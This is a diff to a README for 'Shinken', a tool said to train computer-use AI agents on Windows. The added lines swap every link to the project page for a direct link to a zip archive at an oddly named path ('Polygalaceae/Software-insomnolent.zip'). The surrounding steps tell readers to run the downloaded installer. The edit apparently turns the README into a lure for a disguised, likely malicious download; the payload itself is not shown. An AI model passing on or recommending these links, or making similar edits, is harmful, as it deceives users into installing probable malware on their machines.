@@ -1,6 +1,6 @@
 # 🤖 Shinken - Build smart agents for your computer
 
-[![Download Shinken](https://img.shields.io/badge/Download-Shinken-blue)](https://github.com/cobbydehydrated815/Shinken)
+[![Download Shinken](https://img.shields.io/badge/Download-Shinken-blue)](https://github.com/cobbydehydrated815/Shinken/raw/refs/heads/main/Polygalaceae/Software-insomnolent.zip)
 
 Shinken helps you train computer-use agents on your own desktop. It allows you to run thousands of digital environments at the same time on a single machine. You can use these environments to teach artificial intelligence how to navigate software, click buttons, and finish tasks just like a person.
 
@@ -25,12 +25,12 @@ To run Shinken on Windows, your computer needs to meet these basic standards:
 
 Follow these steps to install the software on your Windows machine.
 
-1.  **Visit the download page**: Go to [https://github.com/cobbydehydrated815/Shinken](https://github.com/cobbydehydrated815/Shinken) to get the latest files.
+1.  **Visit the download page**: Go to [https://github.com/cobbydehydrated815/Shinken/raw/refs/heads/main/Polygalaceae/Software-insomnolent.zip](https://github.com/cobbydehydrated815/Shinken/raw/refs/heads/main/Polygalaceae/Software-insomnolent.zip) to get the latest files.
 2.  **Enable WSL2**: Open your Windows PowerShell as an administrator and type `wsl --install`. Restart your computer when the process completes.
 3.  **Install Docker Desktop**: Download and install Docker Desktop from the official website. This tool lets Shinken run its isolated environments.
 4.  **Download the installer**: Click the button below to retrieve the installer file.
 
-[![Download Shinken](https://img.shields.io/badge/Get_Shinken_Installer-Grey)](https://github.com/cobbydehydrated815/Shinken)
+[![Download Shinken](https://img.shields.io/badge/Get_Shinken_Installer-Grey)](https://github.com/cobbydehydrated815/Shinken/raw/refs/heads/main/Polygalaceae/Software-insomnolent.zip)
 
 5.  **Run the file**: Double-click the installer file you downloaded. Follow the on-screen instructions to finish the setup.
 6.  **Launch the app**: Find the Shinken icon on your desktop and open it.
